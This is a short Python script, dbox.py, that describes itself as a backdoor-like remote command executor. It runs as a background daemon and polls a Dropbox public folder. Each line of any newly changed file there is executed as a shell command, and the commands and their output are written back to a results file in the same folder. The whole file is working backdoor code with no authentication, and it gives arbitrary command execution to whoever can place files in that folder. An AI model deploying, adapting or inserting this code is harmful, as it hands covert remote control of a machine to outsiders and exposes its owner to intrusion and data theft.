#!/usr/bin/env python
'''
     file: dbox.py
     desc: dropbox remote executor
     A backdoor-like service for remote command execution. Dropbox service is used for internet traffic
     USE IT WITH CAUTION!
'''
import os
import time
import daemon
from os.path import join

SOURCE_PATH = os.path.expanduser('~/Dropbox/Public/source')
RESULT_FILE = os.path.expanduser('~/Dropbox/Public/results.txt')
DEFAULT_LATENCY = 20 # unit in second

def do_real_job(path, latency = 20):
    while True:
        # check if any new file in the specific folder
        results = []
        now = time.time()
        for root, dirs, files in os.walk(path):
            for name in filter(lambda n: (now - os.stat(join(root, n)).st_mtime <= latency), files):
                results.append(join(root, name))
        
        # execute the file if the file is valid
        with open(RESULT_FILE, 'a') as res:
            for f in results:
                for line in open(f).readlines():
                    res.write('command: ' + line)
                    res.write(os.popen(line).read())
                    res.write('\n')
                    res.flush()

        # sleep for a while. Don't make CPU too busy
        time.sleep(latency)

if __name__ == "__main__":
    with daemon.DaemonContext():
        do_real_job(SOURCE_PATH, DEFAULT_LATENCY)
